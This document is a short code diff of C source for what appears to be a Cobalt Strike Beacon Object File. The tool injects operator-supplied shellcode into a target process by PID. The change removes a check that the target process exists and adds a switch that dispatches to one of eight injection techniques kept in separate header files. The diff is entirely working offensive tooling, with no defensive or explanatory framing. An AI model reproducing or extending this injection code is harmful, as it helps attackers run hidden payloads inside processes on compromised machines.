@@ -1,13 +1,11 @@
+#include "FirstGuest.h"
+#include "SecondGuest.h"
+#include "ThirdGuest.h"
+#include "FourthGuest.h"
+#include "FifthGuest.h" //
+#include "SixthGuest.h"
 #include "SeventhGuest.h"
-
-int check_pid(DWORD dwPid) {
-   HANDLE hProcess = NULL;
-   hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPid);
-   if (hProcess != NULL) {
-      return 1;
-   }
-   return 0;
-}
+#include "EighthGuest.h" //
 
 void go(char * args, int len) {
     datap parser;
@@ -19,10 +17,16 @@ void go(char * args, int len) {
     DWORD technique = BeaconDataInt(&parser);
 
     BeaconPrintf(CALLBACK_OUTPUT, "Selected technique: %d", technique);
-    // For safety, let's check if target process is running. Targeting an inexistent process would kill Beacon
-    if (check_pid(pid)) {
-       Inject7(pid, shellcode, shellcodeSize);
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "PID %d not found", pid);
-       }
+
+    switch(technique) {
+	case 1: Inject1(pid, shellcode, shellcodeSize); break;
+	case 2: Inject2(pid, shellcode, shellcodeSize); break;
+	case 3: Inject3(pid, shellcode, shellcodeSize); break;
+	case 4: Inject4(pid, shellcode, shellcodeSize); break;
+	case 5: Inject5(pid, shellcode, shellcodeSize); break;
+	case 6: Inject6(pid, shellcode, shellcodeSize); break;
+	case 7: Inject7(pid, shellcode, shellcodeSize); break;
+	case 8: Inject8(pid, shellcode, shellcodeSize); break;
+	default: BeaconPrintf(CALLBACK_OUTPUT, "Invalid technique %d", technique);
+    }
 }
